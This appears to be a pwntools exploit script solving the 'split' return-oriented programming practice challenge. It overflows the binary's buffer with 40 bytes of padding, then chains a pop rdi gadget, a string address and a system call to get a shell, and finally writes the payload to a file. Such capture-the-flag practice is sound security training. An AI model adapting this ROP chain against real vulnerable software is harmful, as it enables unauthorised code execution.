from pwn import *# Set up pwntools to work with this binary
from struct import *

p = process('./split')
elf = ELF('./split')
g = ROP(elf)

buf = b''
buf += b'A'*40

uf = 0x00400742 # func
string = 0x000601060 # string
system = 0x000000000040074b		  # system call
pop_rdi = 0x4007c3 # gadget
buf+= p64(pop_rdi)
buf += p64(string)
buf += p64(system)
print(buf)
p.recvuntil('>')
p.sendline(buf)
p.interactive()
with open('t','wb') as f:
	f.write(buf)